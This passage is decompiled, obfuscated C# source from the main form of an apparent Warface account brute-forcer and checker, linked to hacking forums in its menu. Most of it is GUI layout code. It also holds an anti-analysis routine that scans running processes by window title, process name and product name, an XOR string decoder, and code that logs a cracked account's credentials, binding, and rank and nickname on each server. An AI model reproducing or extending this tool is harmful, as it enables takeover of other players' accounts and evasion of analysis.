			this.SXFUPRUZDTHEJSUQAYFCCR.Location = new Point(137, 37);
			this.SXFUPRUZDTHEJSUQAYFCCR.Name = "ProxyLabel";
			this.SXFUPRUZDTHEJSUQAYFCCR.Size = new Size(13, 13);
			this.SXFUPRUZDTHEJSUQAYFCCR.TabIndex = 6;
			this.SXFUPRUZDTHEJSUQAYFCCR.Text = "0";
			this.FYSXZZNUQZAHVGCQIXUPDC.AutoSize = true;
			this.FYSXZZNUQZAHVGCQIXUPDC.Location = new Point(137, 17);
			this.FYSXZZNUQZAHVGCQIXUPDC.Name = "SourceLabel";
			this.FYSXZZNUQZAHVGCQIXUPDC.Size = new Size(13, 13);
			this.FYSXZZNUQZAHVGCQIXUPDC.TabIndex = 5;
			this.FYSXZZNUQZAHVGCQIXUPDC.Text = "0";
			this.FCEXFLSYDHBAKZZFKIZWB.Location = new Point(12, 465);
			this.FCEXFLSYDHBAKZZFKIZWB.Name = "progressBar1";
			this.FCEXFLSYDHBAKZZFKIZWB.Size = new Size(574, 23);
			this.FCEXFLSYDHBAKZZFKIZWB.TabIndex = 44;
			this.OJMTRGJJOTCPGRRJAUAWS.ToolTipIcon = ToolTipIcon.Info;
			this.OJMTRGJJOTCPGRRJAUAWS.ToolTipTitle = "Информация";
			this.ERXTOLQUJTAWUGWEAEDINT.Items.AddRange(new ToolStripItem[]
			{
				this.CYBDAQACVYNOZYGLZEUNS,
				this.ZWBPVDOFRIYFRAYVXDTXX,
				this.TDFBZYNAWEVMDDVCMLDKMB,
				this.UVVWQANWUOWFCBFTMHEEWJ,
				this.FYQSBXCLTONFCKAYDEHYUQ,
				this.DKCWYGVLHMMRJMCCFIWQKF
			});
			this.ERXTOLQUJTAWUGWEAEDINT.Name = "TrayMenu";
			this.ERXTOLQUJTAWUGWEAEDINT.Size = new Size(263, 136);
			this.CYBDAQACVYNOZYGLZEUNS.Image = (Image)componentResourceManager.GetObject("ShowProgramToolTip.Image");
			this.CYBDAQACVYNOZYGLZEUNS.Name = "ShowProgramToolTip";
			this.CYBDAQACVYNOZYGLZEUNS.Size = new Size(262, 22);
			this.CYBDAQACVYNOZYGLZEUNS.Text = "Показать программу";
			this.CYBDAQACVYNOZYGLZEUNS.Click += this.FXGJOCWISGKIOSWTEWXPWU;
			this.ZWBPVDOFRIYFRAYVXDTXX.Image = (Image)componentResourceManager.GetObject("CheckUpdateTooltip.Image");
			this.ZWBPVDOFRIYFRAYVXDTXX.Name = "CheckUpdateTooltip";
			this.ZWBPVDOFRIYFRAYVXDTXX.Size = new Size(262, 22);
			this.ZWBPVDOFRIYFRAYVXDTXX.Text = "Проверить обновления";
			this.ZWBPVDOFRIYFRAYVXDTXX.Click += this.XICCWKGOBVLAZHIGDEMOHF;
			this.TDFBZYNAWEVMDDVCMLDKMB.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.DRTQBGTIRZWXJLPPHUERKC,
				this.MQIBUMDTVYBZQYGVKBJUXT
			});
			this.TDFBZYNAWEVMDDVCMLDKMB.Image = (Image)componentResourceManager.GetObject("OtzivToolTip.Image");
			this.TDFBZYNAWEVMDDVCMLDKMB.Name = "OtzivToolTip";
			this.TDFBZYNAWEVMDDVCMLDKMB.Size = new Size(262, 22);
			this.TDFBZYNAWEVMDDVCMLDKMB.Text = "Оставить отзыв";
			this.DRTQBGTIRZWXJLPPHUERKC.Name = "youHackToolStripMenuItem";
			this.DRTQBGTIRZWXJLPPHUERKC.Size = new Size(122, 22);
			this.DRTQBGTIRZWXJLPPHUERKC.Text = "YouHack";
			this.DRTQBGTIRZWXJLPPHUERKC.Click += this.NTHVFBNZMWHXBXCLRTHSBQ;
			this.MQIBUMDTVYBZQYGVKBJUXT.Name = "bHFSUToolStripMenuItem";
			this.MQIBUMDTVYBZQYGVKBJUXT.Size = new Size(122, 22);
			this.MQIBUMDTVYBZQYGVKBJUXT.Text = "BHF.SU";
			this.MQIBUMDTVYBZQYGVKBJUXT.Click += this.CNVIPJZQWOQUDKYREHXTHR;
			this.UVVWQANWUOWFCBFTMHEEWJ.Image = (Image)componentResourceManager.GetObject("VisitSiteToolTip.Image");
			this.UVVWQANWUOWFCBFTMHEEWJ.Name = "VisitSiteToolTip";
			this.UVVWQANWUOWFCBFTMHEEWJ.Size = new Size(262, 22);
			this.UVVWQANWUOWFCBFTMHEEWJ.Text = "Посетить офф. сайт разработчика";
			this.UVVWQANWUOWFCBFTMHEEWJ.Click += this.XRUBGQCWYEJYRYBCLRWGHP;
			this.FYQSBXCLTONFCKAYDEHYUQ.Image = (Image)componentResourceManager.GetObject("AboutTooltip.Image");
			this.FYQSBXCLTONFCKAYDEHYUQ.Name = "AboutTooltip";
			this.FYQSBXCLTONFCKAYDEHYUQ.Size = new Size(262, 22);
			this.FYQSBXCLTONFCKAYDEHYUQ.Text = "О программе";
			this.FYQSBXCLTONFCKAYDEHYUQ.Click += this.FOCLYANRFWPOLJKHPRJFT;
			this.DKCWYGVLHMMRJMCCFIWQKF.Image = (Image)componentResourceManager.GetObject("ExitToolTip.Image");
			this.DKCWYGVLHMMRJMCCFIWQKF.Name = "ExitToolTip";
			this.DKCWYGVLHMMRJMCCFIWQKF.Size = new Size(262, 22);
			this.DKCWYGVLHMMRJMCCFIWQKF.Text = "Выход";
			this.ALILMRVYWDOQQUKQBJCGR.Icon = (Icon)componentResourceManager.GetObject("Tray.Icon");
			this.ALILMRVYWDOQQUKQBJCGR.Text = "WarFace Brute&Checker by Amfi v.1.0";
			this.ALILMRVYWDOQQUKQBJCGR.MouseDoubleClick += this.VJUUOTGHFFMUZJZMTVXNXA;
			this.HZTGSINNXJRGAFDNRFDBFA.Location = new Point(224, 15);
			this.HZTGSINNXJRGAFDNRFDBFA.Multiline = true;
			this.HZTGSINNXJRGAFDNRFDBFA.Name = "logMemo";
			this.HZTGSINNXJRGAFDNRFDBFA.ScrollBars = ScrollBars.Both;
			this.HZTGSINNXJRGAFDNRFDBFA.Size = new Size(362, 443);
			this.HZTGSINNXJRGAFDNRFDBFA.TabIndex = 45;
			this.ZVFYMASJADMAVJOJSJIHGV.ForeColor = Color.Black;
			this.ZVFYMASJADMAVJOJSJIHGV.Location = new Point(7, 170);
			this.ZVFYMASJADMAVJOJSJIHGV.Name = "button2";
			this.ZVFYMASJADMAVJOJSJIHGV.Size = new Size(192, 26);
			this.ZVFYMASJADMAVJOJSJIHGV.TabIndex = 47;
			this.ZVFYMASJADMAVJOJSJIHGV.TabStop = false;
			this.ZVFYMASJADMAVJOJSJIHGV.Text = "Прокси Утилита";
			this.ZVFYMASJADMAVJOJSJIHGV.Click += this.JZLQOIJUQRQHLDPBVHGNOD;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(594, 494);
			base.Controls.Add(this.HZTGSINNXJRGAFDNRFDBFA);
			base.Controls.Add(this.FCEXFLSYDHBAKZZFKIZWB);
			base.Controls.Add(this.TFULHNBPHNVGBILKSUMIMI);
			base.Controls.Add(this.QBWZTDJTVRLWGYSSVCHLTD);
			base.Controls.Add(this.AJQOXTRRQTQXKMEXUBGZTV);
			this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			base.FormBorderStyle = FormBorderStyle.FixedSingle;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.Name = "MainForm";
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Warface - Брутфорс\\Чекер - 1.2";
			base.FormClosing += this.QDWTKUMJUCXSAOBUYDWNT;
			base.Load += this.BTUBINGAUWPNNLKXWPCEMM;
			base.Shown += this.GTGIILRWORATPOEJSWQHE;
			((ISupportInitialize)this.EXPFAFSZHYJZJBVNTLEGMT).EndInit();
			this.AJQOXTRRQTQXKMEXUBGZTV.ResumeLayout(false);
			this.QBWZTDJTVRLWGYSSVCHLTD.ResumeLayout(false);
			((ISupportInitialize)this.JWTWZZOMTPYTKGIRGHHPTY).EndInit();
			this.TFULHNBPHNVGBILKSUMIMI.ResumeLayout(false);
			this.TFULHNBPHNVGBILKSUMIMI.PerformLayout();
			this.ERXTOLQUJTAWUGWEAEDINT.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000065D4 File Offset: 0x000047D4
		[CompilerGenerated]
		private static void QWYKZUOZPQOGTTUNWUDTQO(object sender, ThreadExceptionEventArgs e)
		{
			MessageBox.Show(e.Exception.Message);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000065E8 File Offset: 0x000047E8
		[CompilerGenerated]
		private static void TXZTNPDPIYGWAQNOKULZOV(object sender, ElapsedEventArgs e)
		{
			MainForm.AntiS();
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000065F0 File Offset: 0x000047F0
		[CompilerGenerated]
		private static char ZOAEMWHWVHGGLQTMOPIMBQ(char FZUNSIZQQGBKIZQSKYRRL)
		{
			return FZUNSIZQQGBKIZQSKYRRL ^ '\u0003';
		}

		// Token: 0x0400001A RID: 26
		private Thread[] BSXFKAGCOFUTGFLOWXAVOT;

		// Token: 0x0400001B RID: 27
		private bool XMIPVHZLLGHBMQQWXKSWMK = false;

		// Token: 0x0400001C RID: 28
		private string SCEQZFWIWCJGFRQBLZYSIS = "";

		// Token: 0x0400001D RID: 29
		private static int VQITHZTHDIDSEALGFHUSGQ = 15000;

		// Token: 0x0400001E RID: 30
		private object OJIAMLDOLZZVPADKGIMKM = new object();

		// Token: 0x0400001F RID: 31
		private object EHXVDMRADQMWCVYFOLAKVE = new object();

		// Token: 0x04000020 RID: 32
		private object HFHNPSNWMPYXWBDSPEDMQK = new object();

		// Token: 0x04000021 RID: 33
		private static int NTCDHPGJSIOYHAEERMBKD = -1;

		// Token: 0x04000022 RID: 34
		private static int URGDLAOINTAQLSXVJCVLKF = -1;

		// Token: 0x04000023 RID: 35
		public static MainForm form;

		// Token: 0x04000024 RID: 36
		private string UKTIRICDUCEMTCWJRILKGQ;

		// Token: 0x04000026 RID: 38
		private Label VKIFNQQNIMENXQLYQCAROW;

		// Token: 0x04000027 RID: 39
		private Label DYGALWJKFWEXKDIHGANSEZ;

		// Token: 0x04000028 RID: 40
		private Label YIZQXBCMVCPJYXTUAUJIL;

		// Token: 0x04000029 RID: 41
		private Label EWLKCQBEBATYSIZZEADBMQ;

		// Token: 0x0400002A RID: 42
		private Label MJPYICJKMTRGRUIHUBIVDD;

		// Token: 0x0400002B RID: 43
		private Button DQTKZKBMXOLUEIXXGMHUSU;

		// Token: 0x0400002C RID: 44
		private Button ZUPHFYDOEHZKLFRJXCETEJ;

		// Token: 0x0400002D RID: 45
		private Button TZCDBZWQPEWXSAMIGQJDQH;

		// Token: 0x0400002E RID: 46
		private Button AXVYBLZFVNSUDUHVIKFWEO;

		// Token: 0x0400002F RID: 47
		private Button PPTVGXKHNWJMHSBSRQXRHL;

		// Token: 0x04000030 RID: 48
		private NumericUpDown EXPFAFSZHYJZJBVNTLEGMT;

		// Token: 0x04000031 RID: 49
		private GroupBox AJQOXTRRQTQXKMEXUBGZTV;

		// Token: 0x04000032 RID: 50
		private ComboBox BBJDDERACAYCCLSKVCCBLU;

		// Token: 0x04000033 RID: 51
		private GroupBox QBWZTDJTVRLWGYSSVCHLTD;

		// Token: 0x04000034 RID: 52
		private GroupBox TFULHNBPHNVGBILKSUMIMI;

		// Token: 0x04000035 RID: 53
		private ProgressBar FCEXFLSYDHBAKZZFKIZWB;

		// Token: 0x04000036 RID: 54
		private ToolTip OJMTRGJJOTCPGRRJAUAWS;

		// Token: 0x04000037 RID: 55
		private NumericUpDown JWTWZZOMTPYTKGIRGHHPTY;

		// Token: 0x04000038 RID: 56
		private Label LFVDVKVCQWLVMBOFNGCOP;

		// Token: 0x04000039 RID: 57
		private Label ISWBNCEQHNFXBIPHUJHUTZ;

		// Token: 0x0400003A RID: 58
		private Label HOFJDZMQHNLXIEDMCKHUEA;

		// Token: 0x0400003B RID: 59
		private Label SXFUPRUZDTHEJSUQAYFCCR;

		// Token: 0x0400003C RID: 60
		private Label FYSXZZNUQZAHVGCQIXUPDC;

		// Token: 0x0400003D RID: 61
		private ContextMenuStrip ERXTOLQUJTAWUGWEAEDINT;

		// Token: 0x0400003E RID: 62
		private NotifyIcon ALILMRVYWDOQQUKQBJCGR;

		// Token: 0x0400003F RID: 63
		private Button AKAZHAVILPOIACKWLVTUH;

		// Token: 0x04000040 RID: 64
		private ToolStripMenuItem CYBDAQACVYNOZYGLZEUNS;

		// Token: 0x04000041 RID: 65
		private ToolStripMenuItem ZWBPVDOFRIYFRAYVXDTXX;

		// Token: 0x04000042 RID: 66
		private ToolStripMenuItem TDFBZYNAWEVMDDVCMLDKMB;

		// Token: 0x04000043 RID: 67
		private ToolStripMenuItem UVVWQANWUOWFCBFTMHEEWJ;

		// Token: 0x04000044 RID: 68
		private ToolStripMenuItem FYQSBXCLTONFCKAYDEHYUQ;

		// Token: 0x04000045 RID: 69
		private ToolStripMenuItem DKCWYGVLHMMRJMCCFIWQKF;

		// Token: 0x04000046 RID: 70
		private ToolStripMenuItem DRTQBGTIRZWXJLPPHUERKC;

		// Token: 0x04000047 RID: 71
		private ToolStripMenuItem MQIBUMDTVYBZQYGVKBJUXT;

		// Token: 0x04000048 RID: 72
		private TextBox HZTGSINNXJRGAFDNRFDBFA;

		// Token: 0x04000049 RID: 73
		private Button ZVFYMASJADMAVJOJSJIHGV;

		// Token: 0x0400004A RID: 74
		[CompilerGenerated]
		private static ThreadExceptionEventHandler ARNRGTXXRXIOCRSGXYDEIU;

		// Token: 0x0400004B RID: 75
		[CompilerGenerated]
		private static ElapsedEventHandler PRJCEOBUXXXIEQHCPEBOBN;

		// Token: 0x0400004C RID: 76
		[CompilerGenerated]
		private static Func<char, char> ENHWKAZBIGSRZSXUJRHFPZ;

		// Token: 0x02000006 RID: 6
		[CompilerGenerated]
		private sealed class XWJKRQMUJCEWBWEAUKVNOG
		{
			// Token: 0x0600004A RID: 74 RVA: 0x00006624 File Offset: 0x00004824
			public bool TWQMGWAGXPNGGXABMJNVX(Process BYRJZDVAISWNJWJABMIQQL)
			{
				MainForm.XWJKRQMUJCEWBWEAUKVNOG.VHANGKPFSLSAIEOGCLJCHZ vhangkpfslsaieogcljchz = new MainForm.XWJKRQMUJCEWBWEAUKVNOG.VHANGKPFSLSAIEOGCLJCHZ();
				vhangkpfslsaieogcljchz.VJBHRQTBYMUMBOQIQIOYZE = this;
				vhangkpfslsaieogcljchz.BYRJZDVAISWNJWJABMIQQL = BYRJZDVAISWNJWJABMIQQL;
				return this.HFQHYWFNGQMRPIIVKIEALY.Any(new Func<string, bool>(vhangkpfslsaieogcljchz.BSRYAHXXLIPFOGOWYNLICO));
			}

			// Token: 0x0600004B RID: 75 RVA: 0x0000665C File Offset: 0x0000485C
			public bool VLYEJRNKMREFHDLJZDEYXL(Process BYRJZDVAISWNJWJABMIQQL)
			{
				MainForm.XWJKRQMUJCEWBWEAUKVNOG.REPDKJGSRAFNJABZHUBJIO repdkjgsrafnjabzhubjio = new MainForm.XWJKRQMUJCEWBWEAUKVNOG.REPDKJGSRAFNJABZHUBJIO();
				repdkjgsrafnjabzhubjio.VJBHRQTBYMUMBOQIQIOYZE = this;
				repdkjgsrafnjabzhubjio.BYRJZDVAISWNJWJABMIQQL = BYRJZDVAISWNJWJABMIQQL;
				return this.HFQHYWFNGQMRPIIVKIEALY.Any(new Func<string, bool>(repdkjgsrafnjabzhubjio.DBVXTQDZFOXPUGXMVMSVCA));
			}

			// Token: 0x0600004C RID: 76 RVA: 0x00006694 File Offset: 0x00004894
			public bool BALXEGLMBXISPYMSGHMMIU(Process BYRJZDVAISWNJWJABMIQQL)
			{
				MainForm.XWJKRQMUJCEWBWEAUKVNOG.IXFWVXZAWUWMOFDDIFQNTU ixfwvxzawuwmofddifqntu = new MainForm.XWJKRQMUJCEWBWEAUKVNOG.IXFWVXZAWUWMOFDDIFQNTU();
				ixfwvxzawuwmofddifqntu.VJBHRQTBYMUMBOQIQIOYZE = this;
				ixfwvxzawuwmofddifqntu.BYRJZDVAISWNJWJABMIQQL = BYRJZDVAISWNJWJABMIQQL;
				return this.HFQHYWFNGQMRPIIVKIEALY.Any(new Func<string, bool>(ixfwvxzawuwmofddifqntu.KCZQTKJTCPTOUVYBNKDAPJ));
			}

			// Token: 0x0400004D RID: 77
			public string[] HFQHYWFNGQMRPIIVKIEALY;

			// Token: 0x02000007 RID: 7
			private sealed class VHANGKPFSLSAIEOGCLJCHZ
			{
				// Token: 0x0600004E RID: 78 RVA: 0x000066D4 File Offset: 0x000048D4
				public bool BSRYAHXXLIPFOGOWYNLICO(string DMNUFAZMLLHALYTNEOTTA)
				{
					return this.BYRJZDVAISWNJWJABMIQQL.MainWindowTitle.ToLower().Contains(DMNUFAZMLLHALYTNEOTTA.ToLower());
				}

				// Token: 0x0400004E RID: 78
				public MainForm.XWJKRQMUJCEWBWEAUKVNOG VJBHRQTBYMUMBOQIQIOYZE;

				// Token: 0x0400004F RID: 79
				public Process BYRJZDVAISWNJWJABMIQQL;
			}

			// Token: 0x02000008 RID: 8
			private sealed class REPDKJGSRAFNJABZHUBJIO
			{
				// Token: 0x06000050 RID: 80 RVA: 0x00006704 File Offset: 0x00004904
				public bool DBVXTQDZFOXPUGXMVMSVCA(string DMNUFAZMLLHALYTNEOTTA)
				{
					return this.BYRJZDVAISWNJWJABMIQQL.ProcessName.ToLower().Contains(DMNUFAZMLLHALYTNEOTTA.ToLower());
				}

				// Token: 0x04000050 RID: 80
				public MainForm.XWJKRQMUJCEWBWEAUKVNOG VJBHRQTBYMUMBOQIQIOYZE;

				// Token: 0x04000051 RID: 81
				public Process BYRJZDVAISWNJWJABMIQQL;
			}

			// Token: 0x02000009 RID: 9
			private sealed class IXFWVXZAWUWMOFDDIFQNTU
			{
				// Token: 0x06000052 RID: 82 RVA: 0x00006734 File Offset: 0x00004934
				public bool KCZQTKJTCPTOUVYBNKDAPJ(string DMNUFAZMLLHALYTNEOTTA)
				{
					return this.BYRJZDVAISWNJWJABMIQQL.MainModule.FileVersionInfo.ProductName.ToLower().Contains(DMNUFAZMLLHALYTNEOTTA.ToLower());
				}

				// Token: 0x04000052 RID: 82
				public MainForm.XWJKRQMUJCEWBWEAUKVNOG VJBHRQTBYMUMBOQIQIOYZE;

				// Token: 0x04000053 RID: 83
				public Process BYRJZDVAISWNJWJABMIQQL;
			}
		}

		// Token: 0x0200000A RID: 10
		[CompilerGenerated]
		private sealed class HHIIQIYADPSXXZBTWWKDWC
		{
			// Token: 0x06000054 RID: 84 RVA: 0x00006770 File Offset: 0x00004970
			public bool KYIFLJCNLDUIEDTXRJCFVQ(string YVEGDLQBPKPYFETFBQTVHF)
			{
				return this.BYRJZDVAISWNJWJABMIQQL.MainWindowTitle.ToLower().Contains(YVEGDLQBPKPYFETFBQTVHF.ToLower()) || this.BYRJZDVAISWNJWJABMIQQL.ProcessName.ToLower().Contains(YVEGDLQBPKPYFETFBQTVHF.ToLower());
			}

			// Token: 0x04000054 RID: 84
			public MainForm.XWJKRQMUJCEWBWEAUKVNOG VJBHRQTBYMUMBOQIQIOYZE;

			// Token: 0x04000055 RID: 85
			public Process BYRJZDVAISWNJWJABMIQQL;
		}

		// Token: 0x0200000B RID: 11
		[CompilerGenerated]
		private sealed class DTFDFZNLBHQYJLDHUSDUHP
		{
			// Token: 0x06000056 RID: 86 RVA: 0x000067C0 File Offset: 0x000049C0
			public void OAQWSRYSHTVMCEHZDGPVJC()
			{
				TextBox hztgsinnxjrgafdnrfdbfa = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
				hztgsinnxjrgafdnrfdbfa.Text += "===<-Информация->===\r\n";
				TextBox hztgsinnxjrgafdnrfdbfa2 = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
				hztgsinnxjrgafdnrfdbfa2.Text = hztgsinnxjrgafdnrfdbfa2.Text + "Данные от аккаунта - " + ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP[this.RJORVGJCHKPFJBKUOZRTTG].ToString() + "\r\n";
				TextBox hztgsinnxjrgafdnrfdbfa3 = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
				hztgsinnxjrgafdnrfdbfa3.Text = hztgsinnxjrgafdnrfdbfa3.Text + "Привязка - " + this.TPQBSSEPKYTKTBAZCSXUPS + "\r\n";
				if (this.OWZACKOOALGDWJCSYWCWQ != "0")
				{
					TextBox hztgsinnxjrgafdnrfdbfa4 = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
					string text = hztgsinnxjrgafdnrfdbfa4.Text;
					hztgsinnxjrgafdnrfdbfa4.Text = string.Concat(new string[]
					{
						text,
						"Сервер: Альфа - [Ранг - ",
						this.OWZACKOOALGDWJCSYWCWQ,
						"|Ник - ",
						this.NFMVOBDRQVJLHJXTSJBAOK,
						"]\r\n"
					});
				}
				if (this.BQOEFFFQHYXVRILKKRONT != "0")
				{
					TextBox hztgsinnxjrgafdnrfdbfa5 = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
					string text = hztgsinnxjrgafdnrfdbfa5.Text;
					hztgsinnxjrgafdnrfdbfa5.Text = string.Concat(new string[]
					{
						text,
						"Сервер: Браво - [Ранг - ",
						this.BQOEFFFQHYXVRILKKRONT,
						"|Ник - ",
						this.XTVJPMBOTJTXCPHRPTLQDR,
						"]\r\n"
					});
				}
				if (this.YQDNAGNJDPCSNRZFEHIOJD != "0")
				{
					TextBox hztgsinnxjrgafdnrfdbfa6 = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
					string text = hztgsinnxjrgafdnrfdbfa6.Text;
					hztgsinnxjrgafdnrfdbfa6.Text = string.Concat(new string[]
					{
						text,
						"Сервер: Чарли - [Ранг - ",
						this.YQDNAGNJDPCSNRZFEHIOJD,
						"|Ник - ",
						this.WNSJFLFXXGKNJQXXGILJJN,
						"]\r\n"
					});
				}
				TextBox hztgsinnxjrgafdnrfdbfa7 = this.USWUGVEWFPBKNLBCLHMZYS.HZTGSINNXJRGAFDNRFDBFA;
				hztgsinnxjrgafdnrfdbfa7.Text += "===<-Информация->===\r\n";
			}

			// Token: 0x04000056 RID: 86
			public int RJORVGJCHKPFJBKUOZRTTG;

			// Token: 0x04000057 RID: 87
			public string OWZACKOOALGDWJCSYWCWQ;

			// Token: 0x04000058 RID: 88
			public string BQOEFFFQHYXVRILKKRONT;

			// Token: 0x04000059 RID: 89
			public string YQDNAGNJDPCSNRZFEHIOJD;

			// Token: 0x0400005A RID: 90
			public string NFMVOBDRQVJLHJXTSJBAOK;

			// Token: 0x0400005B RID: 91
			public string XTVJPMBOTJTXCPHRPTLQDR;

			// Token: 0x0400005C RID: 92
			public string WNSJFLFXXGKNJQXXGILJJN;

			// Token: 0x0400005D RID: 93
			public string TPQBSSEPKYTKTBAZCSXUPS;

			// Token: 0x0400005E RID: 94
			public MainForm USWUGVEWFPBKNLBCLHMZYS;
		}
	}
}
